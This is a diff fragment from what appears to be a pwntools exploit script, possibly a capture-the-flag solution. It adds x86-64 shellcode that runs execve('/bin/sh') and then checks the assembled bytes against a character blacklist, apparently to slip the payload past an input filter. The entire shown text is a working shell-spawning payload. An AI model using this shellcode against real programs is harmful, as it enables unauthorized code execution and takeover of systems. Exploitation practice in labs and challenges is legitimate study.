@@ -28,6 +28,19 @@ shellcode = '''
     syscall
 '''
 
+shellcode = '''
+    mov rdi, 0x0068732f6e69622f
+
+    push rdi
+    mov rdi, rsp
+
+    xor rsi, rsi
+    xor rdx, rdx
+
+    mov rax, 59
+    syscall
+'''
+
 sc = asm(shellcode)
 for byte in sc:
     if byte in blacklist:
